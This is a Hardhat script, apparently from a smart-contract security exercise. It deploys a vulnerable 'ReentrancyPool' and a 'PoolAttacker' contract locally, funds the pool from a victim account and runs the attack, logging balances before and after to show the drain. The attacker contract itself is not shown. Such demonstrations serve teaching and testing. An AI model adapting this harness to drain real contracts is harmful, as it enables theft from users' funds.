import { ethers } from "hardhat";

async function main() {
  const [deployer, victim] = await ethers.getSigners();

  const PoolFactory = await ethers.getContractFactory("ReentrancyPool");
  const pool = await PoolFactory.deploy();
  await pool.waitForDeployment();

  const AttackerFactory = await ethers.getContractFactory("PoolAttacker");
  const attacker = await AttackerFactory.deploy(await pool.getAddress());
  await attacker.waitForDeployment();

  await pool.connect(victim).contribute({ value: ethers.parseEther("0.8") });

  console.log("Pool balance before:", ethers.formatEther(await ethers.provider.getBalance(await pool.getAddress())));
  console.log("Attacker balance before:", ethers.formatEther(await ethers.provider.getBalance(await attacker.getAddress())));

  await attacker.connect(deployer).attack({ value: ethers.parseEther("0.05") });

  console.log("Pool balance after:", ethers.formatEther(await ethers.provider.getBalance(await pool.getAddress())));
  console.log("Attacker balance after:", ethers.formatEther(await ethers.provider.getBalance(await attacker.getAddress())));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
